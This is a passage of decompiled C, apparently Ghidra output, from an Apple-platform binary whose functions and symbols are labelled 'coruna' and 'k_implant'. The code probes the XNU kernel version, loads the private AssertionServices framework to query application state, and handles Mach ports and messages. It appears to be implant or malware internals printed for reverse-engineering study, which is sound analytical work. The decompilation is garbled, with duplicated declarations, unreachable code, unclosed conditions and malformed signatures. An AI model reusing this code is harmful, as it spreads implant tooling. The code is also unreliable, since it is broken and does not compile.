  thread_attr[0xb] = '\0';
  thread_attr[0xc] = '\0';
  thread_attr[0xd] = '\0';
  thread_attr[0xe] = '\0';
  thread_attr[0xf] = '\0';
  thread_attr[0] = '\0';
  thread_attr[1] = '\0';
  thread_attr[2] = '\0';
  thread_attr[3] = '\0';
  thread_attr[4] = '\0';
  thread_attr[5] = '\0';
  thread_attr[6] = '\0';
  thread_attr[7] = '\0';
  thread_attr[0x18] = '\0';
  thread_attr[0x19] = '\0';
  thread_attr[0x1a] = '\0';
  thread_attr[0x1b] = '\0';
  thread_attr[0x1c] = '\0';
  thread_attr[0x1d] = '\0';
  thread_attr[0x1e] = '\0';
  thread_attr[0x1f] = '\0';
  thread_attr[0x10] = '\0';
  thread_attr[0x11] = '\0';
  thread_attr[0x12] = '\0';
  thread_attr[0x13] = '\0';
  thread_attr[0x14] = '\0';
  thread_attr[0x15] = '\0';
  thread_attr[0x16] = '\0';
  thread_attr[0x17] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,thread_attr);
  if (lk1 != 0) {
    if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
    }
    return u;
    scratch = k_implant_rodata_word_1e880;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,thread_attr,&bootargs,(void *)0x0,0);
    if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
    }
    return u;
  }
  ptr = _strstr(thread_attr,"xnu-");
  if (ptr != (char *)0x0) {
    err = _sscanf(ptr + 4,"%u.%u.%u");
    u = 0;
    if (err != 3) {
      u = 0xad011;
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
  }
  return u;
}





uint64_t coruna_class_respondstoselector(long *handle)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  uint64_t u;
  
  u = 0;
  if (handle != (long *)0x0) {
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
    handle = _dlopen("/System/Library/PrivateFrameworks/AssertionServices.framework/AssertionServices"
                    ,10);
    if (handle == 0) {
      u = 1;
    }
    else {
      addr = _objc_getClass("BKSApplicationStateMonitor");
      off = _sel_registerName("alloc");
      base = _sel_registerName("init");
      ctx_val = _sel_registerName("release");
      serial = _sel_registerName("mostElevatedApplicationStateForPID:");
      if ((((((addr != 0) && (off != 0)) && (base != 0)) && ((ctx_val != 0 && (serial != 0)))) &&
          ((err = _class_respondsToSelector(addr,base), err != 0 &&
           ((err = _class_respondsToSelector(addr,serial), err != 0 &&
            (err = _class_respondsToSelector(addr,ctx_val), err != 0)))))) &&
         (addr = _objc_msgSend(addr,off), addr != 0)) {
        off = _objc_msgSend(addr,base);
        if (off != 0) {
          *handle = handle;
          handle[1] = addr;
          handle[2] = ctx_val;
          handle[3] = serial;
          return 1;
        }
        _objc_msgSend(addr,ctx_val);
      }
      _dlclose(handle);
      u = 0;
    }
  }
  return u;
}





bool coruna_objc_msgsend_19a08(long *handle)
{
  if (handle != (long *)0x0) {
    if ((handle[1] != 0) && (handle[2] != 0)) {
      _objc_msgSend();
    }
    if (*handle != 0) {
      _dlclose();
    }
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
  }
  return handle != (long *)0x0;
}





uint64_t coruna_calloc(uint64_t *val)
{
  int err;
  void *ptr;
  uint64_t u;
  
  u = 0;
  if ((val != (uint64_t *)0x0) && (ptr = _calloc(1,0x20), u = 0, ptr != (void *)0x0)
     ) {
    err = coruna_class_respondstoselector();
    if (err == 0) {
      _free(ptr);
      u = 0;
    }
    else {
      *val = ptr;
      u = 1;
    }
  }
  return u;
}





uint32_t
void coruna_mach_msg_destroy(mach_port_t port,mach_msg_header_t *arg,mach_msg_size_t arg_x,
            mach_msg_timeout_t arg_x_x,int flags)
{
  mach_msg_return_t lm1;
  uint32_t u;
  
  u = 0xad001;
  if (((arg != (mach_msg_header_t *)0x0) && (arg_x != 0)) &&
     (u = 0x1e01b, 1 < port + 1)) {
    arg->msgh_bits = 0x13;
    arg->msgh_size = arg_x;
    arg->msgh_local_port = 0;
    arg->msgh_reserved = 0;
    arg->msgh_remote_port = port;
    if (flags != 0) {
      arg->msgh_bits = 0x80000013;
    }
    lm1 = _mach_msg(arg,0x11,arg_x,0,0,arg_x_x,0);
    if (lm1 == 0) {
      u = 0;
    }
    else if (lm1 == 0x10000004) {
      _mach_msg_destroy(arg);
      u = 0x1e030;
    }
    else {
      u = 0x1e025;
      if (lm1 == 0x10000003) {
        u = 0x1e02f;
      }
    }
  }
  return u;
}





uint32_t
void coruna_mach_msg_destroy_19b70(mach_port_name_t arg,int flags,uint size,mach_msg_header_t *arg_x,
            mach_msg_timeout_t arg_x_x)
{
  uint u;
  uint32_t size;
  
  if (arg_x == (mach_msg_header_t *)0x0) {
    return 0xad001;
  }
  if (size == 0) {
    return 0xad001;
  }
  size = 0x1e021;
  if (arg + 1 < 2) {
    return 0x1e01b;
  }
  _bzero(arg_x,(unsigned long)size);
  arg_x->msgh_remote_port = arg;
  arg_x->msgh_local_port = arg;
  arg_x->msgh_bits = 0x13;
  arg_x->msgh_size = size;
  u = _mach_msg(arg_x,0x102,0,size,arg,arg_x_x,0);
  if ((int)u < 0x10004003) {
    if (u == 0) {
      if (arg_x->msgh_id == flags) {
        if (-1 < (int)arg_x->msgh_bits) {
          return 0;
        }
        size = 0x1e019;
      }
      else {
        size = 0x1e03d;
      }
      _mach_msg_destroy(arg_x);
      return size;
    }
    if (u == 0x10004002) {
      return 0x1e031;
    }
  }
  else {
    if (u == 0x10004003) {
      return 0x1e02a;
    }
    if (u == 0x10004004) {
      if (arg_x->msgh_id == flags) {
        return 0x1e021;
      }
      return 0x1e03d;
    }
  }
  if ((u & 0xfffffffb) != 0x10004008) {
    return 0x1e021;
  }
fail:
  _mach_msg_destroy(arg_x);
  return size;
}





uint8_t * coruna_mach_port_allocate(mach_port_name_t *arg,uint64_t val)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint8_t *buf;
  mach_port_name_t scratch;
  
  ptr = k_implant_mach_task_self_slot;
  if (arg == (mach_port_name_t *)0x0) {
    buf = (uint8_t *)0xad001;
  }
  else {
    scratch = 0;
    lk2 = _mach_port_allocate(*(ipc_space_t *)k_implant_mach_task_self_slot,1,&scratch);
    if (lk2 == 0) {
      if (((int)val == 0) ||
         (buf = (uint8_t *)coruna_mach_port_set_attributes(scratch,val), (int)buf == 0)) {
        buf = (uint8_t *)0x0;
        *arg = scratch;
      }
      else {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
      }
    }
    else {
      buf = &k_implant_rodata_word_1e023;
    }
  }
  return buf;
}





uint32_t coruna_mach_port_set_attributes(mach_port_name_t arg,integer_t arg_x)
{
  uint32_t u;
  kern_return_t lk2;
  integer_t scratch [2];
  
  u = 0x1e01b;
  if (1 < arg + 1) {
    scratch[0] = arg_x;
    lk2 = _mach_port_set_attributes
                      (*(ipc_space_t *)k_implant_mach_task_self_slot,arg,1,scratch,1);
    u = 0;
    if (lk2 != 0) {
      u = 0x1e032;
    }
  }
  return u;
}





uint8_t * coruna_mach_port_insert_right(mach_port_t port,ipc_space_t arg,mach_port_name_t *arg_x)
{
  uint8_t *ptr;
  mach_port_name_t lm2;
  kern_return_t lk3;
  uint8_t *buf;
  int err;
  mach_port_name_t scratch;
  
  ptr = k_implant_mach_task_self_slot;
  if (arg_x == (mach_port_name_t *)0x0) {
    buf = (uint8_t *)0xad001;
  }
  else {
    buf = &k_implant_rodata_word_1e009;
    if (port + 1 < 2) {
      buf = &k_implant_rodata_word_1e01b;
    }
    else if (1 < arg + 1) {
      err = 8;
      do {
        scratch = 0;
        lm2 = port;
        if (*(ipc_space_t *)ptr != arg) {
          lk3 = _mach_port_allocate(arg,1,&scratch);
          if (lk3 != 0) {
            return &k_implant_rodata_word_1e035;
          }
          lk3 = _mach_port_destroy(arg,scratch);
          lm2 = scratch;
          if (lk3 != 0) {
            return &k_implant_rodata_word_1e034;
          }
        }
        scratch = lm2;
        lk3 = _mach_port_insert_right(arg,scratch,port,0x14);
        if ((lk3 == 0) || (*(ipc_space_t *)ptr == arg && lk3 == 0x15)) {
          *arg_x = scratch;
          return (uint8_t *)0x0;
        }
        _usleep(100);
        err = err + -1;
      } while (err != 0);
      buf = &k_implant_rodata_word_1e033;
    }
  }
  return buf;
}





int coruna_ctx_clear_19f00(uint64_t *val)
{
  int err;
  int status;
  
  if (val != (uint64_t *)0x0) {
    err = coruna_bzero_15cc8(val + 2,1);
    status = coruna_bzero_15cc8(val + 6,0x10);
    if (err != 0) {
      status = err;
    }
    err = coruna_bzero_15cc8(val + 4,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_bzero_15cc8(val + 8,4);
    if (err != 0) {
      status = err;
    }
    err = coruna_bzero_15cc8(val + 10,4);
    if (status != 0) {
      err = status;
    }
    status = coruna_bzero_15cc8(val + 0xc,0x18);
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    if (err != 0) {
      status = err;
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    return status;
  }
  return 0xad001;
}
uint8_t * coruna_implant65fc_via_u64_pack_2(unsigned long *arg,unsigned long arg,unsigned long val,long handle,uint size,long addr_2,
            uint64_t val,long off_3,int flags,long *ctx_4)
{
  uint64_t *ptr;
  int err;
  uint8_t *buf;
  char *ptr;
  int *err;
  unsigned long u;
  long *ptr;
  int status;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long bootargs;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long thread_attr;
  unsigned long action;
  unsigned long host_info;
  unsigned long block_ctx;
  unsigned long stack_guard;
  unsigned long serial_buf;
  unsigned long sa_saved;
  int action;
  uint32_t sa_new;
  uint32_t path_buf;
  uint8_t tmp_buf;
  uint8_t region;
  byte block_ctx;
  uint8_t plist;
  
  if (arg == (unsigned long *)0x0) {
    return (uint8_t *)0xad001;
  }
  if (arg == 0) {
    return (uint8_t *)0xad001;
  }
  if ((int)val == 0) {
    return (uint8_t *)0xad001;
  }
  if ((handle == 0) && (size != 0)) {
    return (uint8_t *)0xad001;
  }
  if ((addr_2 == 0) && ((int)val != 0)) {
    return (uint8_t *)0xad001;
  }
  if ((off_3 == 0) && (flags != 0)) {
    return (uint8_t *)0xad001;
  }
  bootargs = 0;
  bootargs = 0;
  thread_attr = 0;
  sa_saved = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  stack_guard = 0;
  serial_buf = 0;
  host_info = 0;
  action = 0;
  thread_attr = 0;
  scratch = val & 0xffffffff;
  scratch = arg;
  buf = (uint8_t *)coruna_implant65fc_via_vec_grow(&action,addr_2,val,arg,val);
  if (((int)buf != 0) ||
     (buf = (uint8_t *)coruna_implant65fc_via_vec_grow(&block_ctx,off_3,flags,arg,val),
     coruna_ctx_clear_19f00(&scratch);
     return buf;
}





uint8_t * coruna_implant65fc_via_vec_grow(long *handle,unsigned long *arg,uint size,unsigned long arg,uint flags_2)
{
  uint u;
  uint8_t *ptr;
  unsigned long size;
  unsigned long version;
  
  ptr = (uint8_t *)0xad001;
  if ((handle != (long *)0x0) && ((arg != (unsigned long *)0x0 || (size == 0)))) {
    if (size != 0) {
      size = (unsigned long)size;
      do {
        version = *arg;
        if (version < arg || arg + flags_2 <= version) {
          return &k_implant_rodata_word_1e007;
        }
        ptr = (uint8_t *)coruna_vec_grow(handle,1,4);
        if ((int)ptr != 0) {
          return ptr;
        }
        u = *(uint *)(handle + 1);
        *(uint *)(handle + 1) = u + 1;
        *(int *)(*handle + (unsigned long)u * 4) = (int)version - (int)arg;
        arg = arg + 1;
        size = size - 1;
      } while (size != 0);
    }
    ptr = (uint8_t *)0x0;
  }
  return ptr;
}





uint64_t coruna_fixup_build_blob(long handle,uint64_t *val,uint *size)
{
  uint64_t u;
  unsigned long *ptr;
  int err;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  
  tag = 0xad01d;
  u = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    bootargs = 0;
    bootargs = 0;
    thread_attr = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    size = *(uint *)(handle + 0x18);
    u = tag;
    if (size < 0xffffffd0) {
      err = 0x30;
      if (size != 0) {
        scratch = coruna_u64_pack((size), (0x30));
        if (0xffffffc8 < size) {
          return 0xad01d;
        }
        err = size + 0x30;
      }
      if (((*(uint *)(handle + 0x28) & 0xc0000000) == 0) &&
         (size = *(uint *)(handle + 0x28) * 4, size <= (-err - 8U | 7))) {
        port = err + 7U & 0xfffffff8;
        if (size != 0) {
          scratch = coruna_u64_pack((size), (err + 7U)) & 0xfffffffffffffff8;
          port = size + port;
        }
        if ((*(uint *)(handle + 0x38) & 0xf0000000) == 0) {
          version = *(uint *)(handle + 0x38) * 0x10;
          size = ~port;
          if (version <= size) {
            if (version != 0) {
              bootargs = coruna_u64_pack((version), (port));
              port = version + port;
              size = ~port;
            }
            if (((*(uint *)(handle + 0x48) & 0xc0000000) == 0) &&
               (version = *(uint *)(handle + 0x48) * 4, version <= size)) {
              if (version != 0) {
                bootargs = coruna_u64_pack((version), (port));
                port = version + port;
                size = ~port;
              }
              if (((*(uint *)(handle + 0x58) & 0xc0000000) == 0) &&
                 (version = *(uint *)(handle + 0x58) * 4, version <= size)) {
                if (version != 0) {
                  thread_attr = coruna_u64_pack((version), (port));
                  port = version + port;
                  size = ~port;
                }
                if ((((unsigned long)*(uint *)(handle + 0x68) * 0x18 & 0xffffffff00000000) == 0) &&
                   (version = *(uint *)(handle + 0x68) * 0x18, version <= size)) {
                  if (version != 0) {
                    thread_attr = coruna_u64_pack((version), (port));
                    port = version + port;
                  }
                  ptr = _calloc(1,(unsigned long)port);
                  if (ptr == (unsigned long *)0x0) {
                    u = 0xad009;
                  }
                  else {
                    ptr[1] = scratch;
                    *ptr = scratch;
                    ptr[3] = bootargs;
                    ptr[2] = bootargs;
                    ptr[5] = thread_attr;
                    ptr[4] = thread_attr;
                    if (scratch != 0) {
                      _memcpy((void *)((long)ptr + (scratch & 0xffffffff)),
                              *(void **)(handle + 0x10),(unsigned long)scratch);
                    }
                    if (scratch != 0) {
                      _memcpy((void *)((long)ptr + (scratch & 0xffffffff)),
                              *(void **)(handle + 0x20),(unsigned long)scratch);
                    }
                    if (bootargs != 0) {
                      _memcpy((void *)((long)ptr + (bootargs & 0xffffffff)),
                              *(void **)(handle + 0x30),(unsigned long)bootargs);
                    }
                    if (bootargs != 0) {
                      _memcpy((void *)((long)ptr + (bootargs & 0xffffffff)),
                              *(void **)(handle + 0x40),(unsigned long)bootargs);
                    }
                    if (thread_attr != 0) {
                      _memcpy((void *)((long)ptr + (thread_attr & 0xffffffff)),
                              *(void **)(handle + 0x50),(unsigned long)thread_attr);
                    }
                    if (thread_attr != 0) {
                      _memcpy((void *)((long)ptr + (thread_attr & 0xffffffff)),
                              *(void **)(handle + 0x60),(unsigned long)thread_attr);
                    }
                    u = 0;
                    *val = ptr;
                    *size = port;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return u;
}





uint64_t
void coruna_implant65fc_via_ctx_clear_19f00(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            uint64_t off_5,uint64_t off_6,uint64_t off_7,uint32_t size,
            uint64_t off_8,long handle,long addr_2)
{
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  if (handle == 0 || addr_2 == 0) {
    u = 0xad001;
  }
  else {
    stack_guard = 0;
    host_info = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    thread_attr = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    bootargs = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    scratch = 0;
    u = coruna_implant65fc_via_u64_pack_2(&scratch,val,id_2,size_3,off_4,off_5,off_6,off_7,size,
                         off_8);
    if ((int)u == 0) {
      u = coruna_fixup_build_blob(&scratch,handle,addr_2);
      coruna_ctx_clear_19f00(&scratch);
    }
  }
  return u;
}





uint64_t coruna_vec_grow(uint64_t *val,uint size,uint flags_2)
{
  uint u;
  uint size;
  void *ptr;
  void *buf;
  uint64_t version;
  
  version = 0xad01d;
  if (val == (uint64_t *)0x0) {
    version = 0xad001;
  }
  else {
    u = *(uint *)(val + 1);
    if ((unsigned long)*(uint *)((long)val + 0xc) < (unsigned long)u + (unsigned long)size) {
      size = u + size * 10;
      if ((size != 0xffffffff) && (((unsigned long)flags_2 * (unsigned long)size & 0xffffffff00000000) == 0)) {
        ptr = _calloc(1,(unsigned long)flags_2 * (unsigned long)size & 0xffffffff);
        if (ptr == (void *)0x0) {
          version = 0xad009;
        }
        else {
          buf = (void *)*val;
          if (buf != (void *)0x0) {
            u = u * flags_2;
            if (u != 0) {
              _memcpy(ptr,buf,(unsigned long)u);
              _bzero((void *)*val,(unsigned long)u);
              buf = (void *)*val;
            }
            _free(buf);
          }
          version = 0;
          *val = ptr;
          *(uint *)((long)val + 0xc) = size;
        }
      }
    }
    else {
      version = 0;
    }
  }
  return version;
}





uint64_t coruna_bzero_15cc8(uint64_t *val,int flags)
{
  void *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (void *)*val;
    if (ptr != (void *)0x0) {
      if (*(int *)(val + 1) != 0) {
        _bzero(ptr,(unsigned long)(uint)(*(int *)(val + 1) * flags));
        ptr = (void *)*val;
      }
      _free(ptr);
    }
    *val = 0;
    val[1] = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_memcpy_1a808(long *handle,void *ctx,unsigned long arg,uint32_t *size)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (ctx != (void *)0x0)) {
    if ((int)arg == 0) {
      u = 0;
      if (size != (uint32_t *)0x0) {
        *size = 0;
      }
    }
    else {
      u = coruna_vec_grow(handle,arg,1);
      if ((int)u == 0) {
        _memcpy((void *)(*handle + (unsigned long)*(uint *)(handle + 1)),ctx,arg & 0xffffffff);
        if (size != (uint32_t *)0x0) {
          *size = (int)handle[1];
        }
        u = 0;
        *(int *)(handle + 1) = (int)handle[1] + (int)arg;
      }
    }
  }
  return u;
}





uint64_t coruna_memmem(int *flags,char *path,int *count_2)
{
  uint64_t u;
  size_t ls2;
  void *ptr;
  
  u = 0xad001;
  if (((flags != (int *)0x0) && (path != (char *)0x0)) && (count_2 != (int *)0x0)) {
    ls2 = _strlen(path);
    if ((flags[2] == 0) ||
       (ptr = _memmem(*(void **)flags,(unsigned long)(uint)flags[2],path,ls2 + 1),
       ptr == (void *)0x0)) {
      u = coruna_memcpy_1a808(flags,path,ls2 + 1,count_2);
      return u;
    }
    u = 0;
    *count_2 = (int)ptr - *flags;
  }
  return u;
}





uint8_t * coruna_mach_msg(long handle,uint8_t *buf,mach_msg_id_t *arg,uint size,uint flags_2,
            mach_port_t port)
{
  uint32_t u;
  mach_msg_id_t lm2;
  mach_msg_id_t *lpm3;
  mach_msg_id_t *lpm4;
  size_t ls5;
  long handle;
  uint64_t size;
  uint64_t version;
  uint8_t *ptr;
  uint port;
  void (*ptr)(void);
  int err;
  uint8_t *buf;
  uint8_t *str;
  unsigned long scratch;
  mach_msg_id_t *bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint8_t host_info[12];
  mach_port_t serial_buf;
  mach_msg_size_t action;
  mach_msg_id_t block_ctx;
  mach_msg_id_t stack_guard;
  uint8_t host_info;
  uint8_t serial_buf;
  uint16_t action;
  uint32_t block_ctx;
  uint16_t stack_guard;
  uint16_t sa_saved;
  uint32_t sa_new;
  uint32_t sa_saved;
  int sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t frame;
  uint64_t work;
  uint64_t work;
  uint64_t cache;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_25;
  long cache_26;
  
  cache_26 = *(long *)k_implant_stack_chk_guard_slot;
  str = (uint8_t *)0xad001;
  unique0x1000053e = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
  if ((handle == 0) ||
     ((arg == (mach_msg_id_t *)0x0 &&
      (unique0x10000546 = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info)), size != 0))))
  if (*(long *)k_implant_stack_chk_guard_slot != cache_26) {
  ___stack_chk_fail();
  }
  return str;
  err = (int)buf;
  _bzero(&scratch,0x800);
  lpm4 = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
  lpm3 = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
  if ((((unsigned long)buf & 0xfffffff7) != 0) && (flags_2 + 1 < 2)) {
done:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
  }
  buf = buf;
  str = buf;
  unique0x1000051e = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
  switch((unsigned long)buf & 0xffffffff) {
  case 0:
    break;
  case 1:
  case 2:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
    host_info = (uint8_t)arg[5];
    stack_guard = arg[4];
    unique0x00048400 = *(mach_msg_id_t **)arg;
    host_info = flags_2;
    action = (mach_msg_size_t)*(uint64_t *)(arg + 2);
    block_ctx = (mach_msg_id_t)((unsigned long)*(uint64_t *)(arg + 2) >> 0x20);
    serial_buf = 0;
    handle = *(long *)(handle + 0x18);
    size = *(uint64_t *)(handle + 0x20);
    u = 0x4000000e;
    if (err != 1) {
      u = 0x40000012;
    }
    ptr = *(void (**)(handle + 0x28);
check_ok:
    str = (uint8_t *)(*ptr)(handle,size,u,host_info);
    (**(void (**)(*(long *)(handle + 0x18) + 0x28))
              (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),0xc,flags_2);
skip:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    break;
  case 3:
  case 4:
    if ((size < 5) ||
       (unique0x00023700 = arg + 1,
       buf = (uint8_t *)0x0;
       buf = (uint8_t *)0x0;
       str = &k_implant_rodata_word_1e020;
       unique0x10000516 = lpm3;
       break;
    if (1 < flags_2 + 1) {
      lm2 = *arg;
      host_info = flags_2;
      ls5 = _strlen((char *)unique0x00023700);
      action = (mach_msg_size_t)ls5;
      handle = *(long *)(handle + 0x18);
      size = *(uint64_t *)(handle + 0x20);
      ptr = *(void (**)(handle + 0x28);
      u = 0x40000011;
      block_ctx = lm2;
      if (err != 3) {
        u = 0x40000010;
      }
      str = (uint8_t *)(*ptr)(handle,size,u,host_info);
      (**(void (**)(*(long *)(handle + 0x18) + 0x28))
      (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),0xc,flags_2);
    }
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
  case 5:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    if (1 < flags_2 + 1) {
      handle = *(long *)(handle + 0x18);
      size = *(uint64_t *)(handle + 0x20);
      ptr = *(void (**)(handle + 0x28);
      ptr = (uint8_t *)(unsigned long)flags_2;
      version = 0xc;
next:
      str = (uint8_t *)(*ptr)(handle,size,version,ptr);
      goto skip;
    }
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
  case 6:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    if (1 < flags_2 + 1) {
      handle = *(long *)(handle + 0x18);
      size = *(uint64_t *)(handle + 0x20);
      ptr = *(void (**)(handle + 0x28);
      ptr = (uint8_t *)(unsigned long)flags_2;
      version = 0x16;
      goto next;
    }
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
  case 7:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    if (1 < flags_2 + 1) {
      handle = *(long *)(handle + 0x18);
      size = *(uint64_t *)(handle + 0x20);
      ptr = *(void (**)(handle + 0x28);
      ptr = (uint8_t *)(unsigned long)flags_2;
      version = 0x1a;
      goto next;
    }
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
  case 8:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    host_info = 0;
    host_info = flags_2;
    str = (uint8_t *)
              (**(void (**)(*(long *)(handle + 0x18) + 0x28))
                        (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),0xc0000020,
                         host_info);
    buf = (uint8_t *)0x0;
    port = host_info;
    if ((int)str != 0) {
      port = 0;
    }
    buf = (uint8_t *)(unsigned long)port;
    break;
  case 9:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    if (1 < flags_2 + 1) {
      host_info = (uint8_t)arg[5];
      stack_guard = arg[4];
      host_info = flags_2;
      host_info = (uint32_t)*(uint64_t *)arg;
      serial_buf = (mach_port_t)((unsigned long)*(uint64_t *)arg >> 0x20);
      action = (mach_msg_size_t)*(uint64_t *)(arg + 2);
      block_ctx = (mach_msg_id_t)((unsigned long)*(uint64_t *)(arg + 2) >> 0x20);
      serial_buf = 0;
      handle = *(long *)(handle + 0x18);
      size = *(uint64_t *)(handle + 0x20);
      version = 0x40000021;
      ptr = *(void (**)(handle + 0x28);
      ptr = host_info;
      goto next;
    }
cleanup:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
  case 10:
  case 0xb:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &k_implant_rodata_word_1e020;
    unique0x10000516 = lpm3;
    break;
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = (uint8_t *)0xad001;
    unique0x10000536 = lpm4;
    break;
    host_info = flags_2;
    host_info = (uint32_t)*(uint64_t *)arg;
    serial_buf = (mach_port_t)((unsigned long)*(uint64_t *)arg >> 0x20);
    action = (mach_msg_size_t)*(uint64_t *)(arg + 2);
    block_ctx = (mach_msg_id_t)((unsigned long)*(uint64_t *)(arg + 2) >> 0x20);
    stack_guard = coruna_cat(stack_guard._1_3_,(char)arg[4]);
    stack_guard = 0;
    sa_saved = 0;
    sa_new = 0;
    host_info = 0;
    serial_buf = 0;
    action = 0;
    block_ctx = 0;
    u = 0xc0000023;
    if (err != 10) {
      u = 0x40000023;
    }
    str = (uint8_t *)
              (**(void (**)(*(long *)(handle + 0x18) + 0x28))
                        (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),u,host_info);
    buf = (uint8_t *)0x0;
    bootargs = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
    scratch = host_info;
    bootargs = coruna_cat(action,coruna_cat(serial_buf,coruna_u64_pack14((host_info), (stack_guard))));
    scratch = coruna_u64_pack((block_ctx), (action));
    thread_attr = coruna_u64_pack((sa_saved), (sa_new));
    thread_attr = coruna_cat(sa_saved,coruna_cat(stack_guard,block_ctx));
    port = 0x30;
    if ((int)str != 0) {
      port = 0;
    }
    buf = (uint8_t *)(unsigned long)port;
    unique0x1000052e = bootargs;
    break;
  default:
    buf = (uint8_t *)0x0;
    buf = (uint8_t *)0x0;
    str = &UNK_0001e026;
    unique0x10000526 = (mach_msg_id_t *)coruna_u64_pack((serial_buf), (host_info));
  }
switchD_0001ab20_caseD_0:
  if (1 < port + 1) {
    cache_25 = 0;
    cache_25 = 0;
    cache_24 = 0;
    cache_27 = 0;
    cache_26 = 0;
    cache_24 = 0;
    cache_23 = 0;
    cache_23 = 0;
    cache_22 = 0;
    cache_22 = 0;
    cache_21 = 0;
    cache_21 = 0;
    cache_20 = 0;
